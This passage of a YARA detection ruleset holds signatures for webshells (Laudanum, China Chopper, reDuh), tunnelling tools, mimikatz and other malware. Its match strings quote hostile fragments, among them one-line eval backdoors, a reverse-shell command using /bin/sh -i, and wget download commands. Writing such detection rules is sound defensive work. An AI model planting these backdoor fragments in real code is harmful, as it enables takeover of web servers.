      
   strings:
      $s1 = "$query = isset($_POST['query']) ? $_POST['query'] : '';" fullword ascii
      $s2 = "$result = dns_get_record($query, $types[$type], $authns, $addtl);" fullword ascii
      $s3 = "if ($_SERVER[\"REMOTE_ADDR\"] == $IP)" fullword ascii
      $s4 = "foreach (array_keys($types) as $t) {" fullword ascii
   condition: 
      filesize < 15KB and all of them
}

rule Webshell_jsp_cmd_2_RID2E17 : DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file cmd.war"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 10:59:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "cmd.jsp}" fullword ascii
      $s1 = "cmd.jspPK" fullword ascii
      $s2 = "WEB-INF/web.xml" fullword ascii
      $s3 = "WEB-INF/web.xmlPK" fullword ascii
      $s4 = "META-INF/MANIFEST.MF" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x4b50 and filesize < 2KB and all of them
}

rule Webshell_laudanum_RID2DFD : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file laudanum.php"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 10:55:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "public function __activate()" fullword ascii
      $s2 = "register_activation_hook(__FILE__, array('WP_Laudanum', 'activate'));" fullword ascii
   condition: 
      filesize < 5KB and all of them
}

rule Webshell_php_file_RID2DED : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file file.php"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 10:52:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "$allowedIPs =" fullword ascii
      $s2 = "<a href=\"<?php echo $_SERVER['PHP_SELF']  ?>\">Home</a><br/>" fullword ascii
      $s3 = "$dir  = isset($_GET[\"dir\"])  ? $_GET[\"dir\"]  : \".\";" fullword ascii
      $s4 = "$curdir .= substr($curdir, -1) != \"/\" ? \"/\" : \"\";" fullword ascii
   condition: 
      filesize < 10KB and all of them
}

rule php_reverse_shell_2_RID2EBC : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file php-reverse-shell.php"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 11:27:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "$process = proc_open($shell, $descriptorspec, $pipes);" fullword ascii
      $s7 = "$shell = 'uname -a; w; id; /bin/sh -i';" fullword ascii
   condition: 
      filesize < 10KB and all of them
}

rule Webshell_Laudanum_Tools_Generic_RID3369 : DEMO GEN T1505_003 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 14:46:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "885e1783b07c73e7d47d3283be303c9719419b92"
      hash2 = "01d5d16d876c55d77e094ce2b9c237de43b21a16"
      hash3 = "7421d33e8007c92c8642a36cba7351c7f95a4335"
      tags = "DEMO, GEN, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "***  laudanum@secureideas.net" fullword ascii
      $s2 = "*** Laudanum Project" fullword ascii
   condition: 
      filesize < 60KB and all of them
}

rule Webshell_Txt_aspx1_RID2E32 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - Webshells - file aspx1.txt"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 11:04:11"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[" 
      $s1 = "],\"unsafe\");%>" fullword ascii
   condition: 
      filesize < 150 and all of them
}

rule Webshell_Shell_Asp_RID2E21 : CHINA DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set Webshells - file Asp.html"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 11:01:21"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Session.Contents.Remove(m & \"userPassword\")" fullword ascii
      $s2 = "passWord = Encode(GetPost(\"password\"))" fullword ascii
      $s3 = "function Command(cmd, str){" fullword ascii
   condition: 
      filesize < 100KB and all of them
}

rule Webshell_Txt_aspxtag_RID2F3D : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - Webshells - file aspxtag.txt"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 11:48:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "String wGetUrl=Request.QueryString[" fullword ascii
      $s2 = "sw.Write(wget);" fullword ascii
      $s3 = "Response.Write(\"Hi,Man 2015\"); " fullword ascii
   condition: 
      filesize < 2KB and all of them
}

rule Webshell_Txt_php_RID2D8D : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - Webshells - file php.txt"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 10:36:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "$Config=$_SERVER['QUERY_STRING'];" fullword ascii
      $s2 = "gzuncompress($_SESSION['api']),null);" ascii
      $s3 = "sprintf('%s?%s',pack(\"H*\"," ascii
      $s4 = "if(empty($_SESSION['api']))" fullword ascii
   condition: 
      filesize < 1KB and all of them
}

rule Webshell_Txt_asp_RID2D89 : CHINA DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - Webshells - file asp.txt"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 10:36:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Server.ScriptTimeout=999999999:Response.Buffer=true:On Error Resume Next:BodyCol" ascii
      $s2 = "<%@ LANGUAGE = VBScript.Encode %><%" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x253c and filesize < 100KB and all of them
}

rule Webshell_Txt_lcx_RID2D8C : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - Webshells - file lcx.c"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 10:36:31"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "printf(\"Usage:%s -m method [-h1 host1] -p1 port1 [-h2 host2] -p2 port2 [-v] [-l" ascii
      $s2 = "sprintf(tmpbuf2,\"\\r\\n########### reply from %s:%d ####################\\r\\n" ascii
      $s3 = "printf(\" 3: connect to HOST1:PORT1 and HOST2:PORT2\\r\\n\");" fullword ascii
      $s4 = "printf(\"got,ip:%s,port:%d\\r\\n\",inet_ntoa(client1.sin_addr),ntohs(client1.sin" ascii
      $s5 = "printf(\"[-] connect to host1 failed\\r\\n\");" fullword ascii
   condition: 
      filesize < 25KB and 2 of them
}

rule Webshell_Txt_jspcmd_RID2EC6 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - Webshells - file jspcmd.txt"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 11:28:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "if(\"1752393\".equals(request.getParameter(\"Confpwd\"))){" fullword ascii
      $s4 = "out.print(\"Hi,Man 2015\");" fullword ascii
   condition: 
      filesize < 1KB and 1 of them
}

rule Webshell_Txt_aspxlcx_RID2F48 : CHINA DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - Webshells - file aspxlcx.txt"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 11:50:31"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "public string remoteip = " ascii
      $s2 = "=Dns.Resolve(host);" ascii
      $s3 = "public string remoteport = " ascii
      $s4 = "public class PortForward" ascii
   condition: 
      uint16 ( 0 ) == 0x253c and filesize < 18KB and all of them
}

rule CN_Tools_xbat_RID2C20 : APT CHINA DEMO FILE SCRIPT {
   meta:
      description = "Chinese Hacktool Set - file xbat.vbs"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:35:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, CHINA, DEMO, FILE, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "ws.run \"srss.bat /start\",0 " fullword ascii
      $s1 = "Set ws = Wscript.CreateObject(\"Wscript.Shell\")" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x6553 and filesize < 0KB and all of them
}

rule CN_Tools_Temp_RID2C07 : APT CHINA DEMO FILE {
   meta:
      description = "Chinese Hacktool Set - file Temp.war"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:31:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, CHINA, DEMO, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "META-INF/context.xml<?xml version=\"1.0\" encoding=\"UTF-8\"?>" fullword ascii
      $s1 = "browser.jsp" fullword ascii
      $s3 = "cmd.jsp" fullword ascii
      $s4 = "index.jsp" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x4b50 and filesize < 203KB and all of them
}

rule sql1433_Start_RID2B99 : APT CHINA DEMO SCRIPT {
   meta:
      description = "Chinese Hacktool Set - file Start.bat"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:13:21"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, CHINA, DEMO, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "for /f \"eol=- tokens=1 delims= \" %%i in (result.txt) do echo %%i>>s1.txt" fullword ascii
      $s2 = "start creck.bat" fullword ascii
      $s3 = "del s1.txt" fullword ascii
      $s4 = "del Result.txt" fullword ascii
      $s5 = "del s.TXT" fullword ascii
      $s6 = "mode con cols=48 lines=20" fullword ascii
   condition: 
      filesize < 1KB and 2 of them
}

rule Webshell_ChinaChopper_one_RID30FB : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file one.asp"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 13:03:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<%eval request(" ascii
   condition: 
      filesize < 50 and all of them
}

rule Webshell_ChinaChopper_temp_2_RID3200 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file temp.php"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 13:46:31"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "@eval($_POST[strtoupper(md5(gmdate(" ascii
   condition: 
      filesize < 150 and all of them
}

rule Webshell_templatr_RID2E0F : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file templatr.php"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 10:58:21"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "eval(gzinflate(base64_decode('" ascii
   condition: 
      filesize < 70KB and all of them
}

rule Webshell_InjectionParameters_RID325D : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file InjectionParameters.vb"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 14:02:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "Public Shared ReadOnly Empty As New InjectionParameters(-1, \"\")" fullword ascii
      $s1 = "Public Class InjectionParameters" fullword ascii
   condition: 
      filesize < 13KB and all of them
}

rule Webshell_oracle_data_RID2F15 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file oracle_data.php"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 11:42:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "$txt=fopen(\"oracle_info.txt\",\"w\");" fullword ascii
      $s1 = "if(isset($_REQUEST['id']))" fullword ascii
      $s2 = "$id=$_REQUEST['id'];" fullword ascii
   condition: 
      all of them
}

rule Webshell_reDuhServers_reDuh_RID31DF : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file reDuh.jsp"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 13:41:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "out.println(\"[Error]Unable to connect to reDuh.jsp main process on port \" +ser" ascii
      $s4 = "System.out.println(\"IPC service failed to bind to \" + servicePort);" fullword ascii
      $s17 = "System.out.println(\"Bound on \" + servicePort);" fullword ascii
      $s5 = "outputFromSockets.add(\"[data]\"+target+\":\"+port+\":\"+sockNum+\":\"+new Strin" ascii
   condition: 
      filesize < 116KB and all of them
}

rule Webshell_item_old_RID2DF3 : CHINA DEMO T1105 T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file item-old.php"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 10:53:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1105, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "$sCmd = \"wget -qc \".escapeshellarg($sURL).\" -O \".$sFile;" fullword ascii
      $s2 = "$sCmd = \"convert \".$sFile.\" -flip -quality 80 \".$sFileOut;" fullword ascii
      $s3 = "$sHash = md5($sURL);" fullword ascii
   condition: 
      filesize < 7KB and 2 of them
}

rule Webshell_reDuhServers_reDuh_2_RID3270 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file reDuh.php"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 14:05:11"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "errorlog(\"FRONTEND: send_command '\".$data.\"' on port \".$port.\" returned \"." ascii
      $s2 = "$msg = \"newData:\".$socketNumber.\":\".$targetHost.\":\".$targetPort.\":\".$seq" ascii
      $s3 = "errorlog(\"BACKEND: *** Socket key is \".$sockkey);" fullword ascii
   condition: 
      filesize < 57KB and all of them
}

rule Webshell_Customize_5_RID2EFD : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file Customize.jsp"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 11:38:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "while((l=br.readLine())!=null){sb.append(l+\"\\r\\n\");}}" fullword ascii
      $s2 = "String Z=EC(request.getParameter(Pwd)+\"\",cs);String z1=EC(request.getParameter" ascii
   condition: 
      filesize < 30KB and all of them
}

rule Webshell_CN_Tools_old_RID2F45 : CHINA DEMO T1105 T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file old.php"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 11:50:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1105, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "$sCmd = \"wget -qc \".escapeshellarg($sURL).\" -O \".$sFile;" fullword ascii
      $s1 = "$sURL = \"http://\".$sServer.\"/\".$sFile;" fullword ascii
      $s2 = "chmod(\"/\".substr($sHash, 0, 2), 0777);" fullword ascii
      $s3 = "$sCmd = \"echo 123> \".$sFileOut;" fullword ascii
   condition: 
      filesize < 6KB and all of them
}

rule Webshell_item_301_RID2D48 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file item-301.php"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 10:25:11"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "$sURL = \"301:http://\".$sServer.\"/index.asp\";" fullword ascii
      $s2 = "(gov)\\\\.(cn)$/i\", $aURL[\"host\"])" ascii
      $s3 = "$aArg = explode(\" \", $sContent, 5);" fullword ascii
      $s4 = "$sURL = $aArg[0];" fullword ascii
   condition: 
      filesize < 3KB and 3 of them
}

rule Webshell_CN_Tools_item_RID2FB5 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file item.php"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 12:08:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "$sURL = \"http://\".$sServer.\"/\".$sWget;" fullword ascii
      $s2 = "$sURL = \"301:http://\".$sServer.\"/\".$sWget;" fullword ascii
      $s3 = "$sWget=\"index.asp\";" fullword ascii
      $s4 = "$aURL += array(\"scheme\" => \"\", \"host\" => \"\", \"path\" => \"\");" fullword ascii
   condition: 
      filesize < 4KB and all of them
}

rule Webshell_f3_diy_RID2CE4 : CHINA DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file diy.asp"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 10:08:31"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<%@LANGUAGE=\"VBScript.Encode\" CODEPAGE=\"936\"%>" fullword ascii
      $s5 = ".black {" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x253c and filesize < 10KB and all of them
}

rule Webshell_ChinaChopper_temp_RID316F : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file temp.asp"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 13:22:21"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "o.run \"ff\",Server,Response,Request,Application,Session,Error" fullword ascii
      $s1 = "Set o = Server.CreateObject(\"ScriptControl\")" fullword ascii
      $s2 = "o.language = \"vbscript\"" fullword ascii
      $s3 = "o.addcode(Request(\"SC\"))" fullword ascii
   condition: 
      filesize < 1KB and all of them
}

rule Webshell_Tools_2015_RID2DDE : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file 2015.jsp"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 10:50:11"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "Configbis = new BufferedInputStream(httpUrl.getInputStream());" fullword ascii
      $s4 = "System.out.println(Oute.toString());" fullword ascii
      $s5 = "String ConfigFile = Outpath + \"/\" + request.getParameter(\"ConFile\");" fullword ascii
      $s8 = "HttpURLConnection httpUrl = null;" fullword ascii
      $s19 = "Configbos = new BufferedOutputStream(new FileOutputStream(Outf));;" fullword ascii
   condition: 
      filesize < 7KB and all of them
}

rule Webshell_reDuhServers_reDuh_3_RID3271 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file reDuh.aspx"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 14:05:21"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Response.Write(\"[Error]Unable to connect to reDuh.jsp main process on port \" +" ascii
      $s2 = "host = System.Net.Dns.Resolve(\"127.0.0.1\");" fullword ascii
      $s3 = "rw.WriteLine(\"[newData]\" + targetHost + \":\" + targetPort + \":\" + socketNum" ascii
      $s4 = "Response.Write(\"Error: Bad port or host or socketnumber for creating new socket" ascii
   condition: 
      filesize < 40KB and all of them
}

rule Webshell_ChinaChopper_temp_3_RID3201 : CHINA DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file temp.aspx"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 13:46:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"" ascii
      $s1 = "\"],\"unsafe\");%>" ascii
   condition: 
      uint16 ( 0 ) == 0x253c and filesize < 150 and all of them
}

rule Kiwi_Tools_Mimikatz_1_RID2F4A : CHINA DEMO EXE FILE HKTL S0002 T1003 T1134_005 T1550_002 T1550_003 {
   meta:
      description = "Chinese Hacktool Set - from mimikatz files"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 11:50:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "55d5dabd96c44d16e41f70f0357cba1dda26c24f"
      hash2 = "7ac7541e20af7755b7d8141c5c1b7432465cabd8"
      hash3 = "9fbfe3eb49d67347ab57ae743f7542864bc06de6"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, S0002, T1003, T1134_005, T1550_002, T1550_003"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "http://blog.gentilkiwi.com/mimikatz" ascii
      $s2 = "Benjamin Delpy" fullword ascii
      $s3 = "GlobalSign" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them
}

rule Kiwi_Tools_Mimikatz_2_RID2F4B : CHINA DEMO EXE FILE HKTL S0002 T1003 T1134_005 T1550_002 T1550_003 {
   meta:
      description = "Chinese Hacktool Set - from mimikatz files"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 11:51:01"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "55d5dabd96c44d16e41f70f0357cba1dda26c24f"
      hash2 = "7ac7541e20af7755b7d8141c5c1b7432465cabd8"
      hash3 = "9fbfe3eb49d67347ab57ae743f7542864bc06de6"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, S0002, T1003, T1134_005, T1550_002, T1550_003"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "mimikatz" fullword wide
      $s2 = "Copyright (C) 2012 Gentil Kiwi" fullword wide
      $s3 = "Gentil Kiwi" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them
}

rule MAL_Fidelis_Advisory_Purchase_Order_pps_RID3661 : DEMO MAL {
   meta:
      description = "Detects a string found in a malicious document named Purchase_Order.pps"
      author = "Florian Roth"
      reference = "http://www.fidelissecurity.com/sites/default/files/FTA_1017_Phishing_in_Plain_Sight-Body-FINAL.pdf"
      date = "2015-06-09 16:53:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      tags = "DEMO, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "Users\\Gozie\\Desktop\\Purchase-Order.gif" ascii
   condition: 
      all of them
}

rule APT_Malware_PutterPanda_Gen4_RID3192 : APT DEMO EXE FILE G0024 {
   meta:
      description = "Detects Malware related to PutterPanda"
      author = "Florian Roth"
      reference = "VT Analysis"
      date = "2015-06-03 13:28:11"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "8fdd6e5ed9d69d560b6fdd5910f80e0914893552"
      hash2 = "3c4a762175326b37035a9192a981f7f4cc2aa5f0"
      hash3 = "598430b3a9b5576f03cc4aed6dc2cd8a43324e1e"
      tags = "APT, DEMO, EXE, FILE, G0024"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "rz.dat" fullword ascii
      $s0 = "Mozilla/4.0 (Compatible; MSIE 6.0;)" fullword ascii
      $s1 = "Internet connect error:%d" fullword ascii
      $s2 = "Proxy-Authorization:Basic " fullword ascii
      $s5 = "Invalid url" fullword ascii
      $s6 = "Create file failed" fullword ascii
      $s7 = "myAgent" fullword ascii
      $z1 = "%s%s%d%d" fullword ascii
      $z2 = "HttpQueryInfo failed:%d" fullword ascii
      $z3 = "read file error:%d" fullword ascii
      $z4 = "down file success" fullword ascii
      $z5 = "kPStoreCreateInstance" fullword ascii
      $z6 = "Avaliable data:%u bytes" fullword ascii
      $z7 = "abe2869f-9b47-4cd9-a358-c22904dba7f7" fullword ascii
   condition: 
      filesize < 300KB and ( ( uint16 ( 0 ) == 0x5a4d and $x1 and 3 of ( $s* ) ) or ( 3 of ( $s* ) and 4 of ( $z* ) ) )
}

rule SVG_LoadURL_RID2AD3 : DEMO EXPLOIT {
   meta:
      description = "Detects a tiny SVG file that loads an URL (as seen in CryptoWall malware infections)"
      author = "Florian Roth"
      reference = "https://www.appriver.com/resources/blog"
      date = "2015-05-24 08:43:21"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2026-03-12"
      tags = "DEMO, EXPLOIT"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "</svg>" nocase
      $s2 = "<script>" nocase
      $s3 = "location.href='http" nocase
   condition: 
      filesize < 600 and all of ( $s* )
}

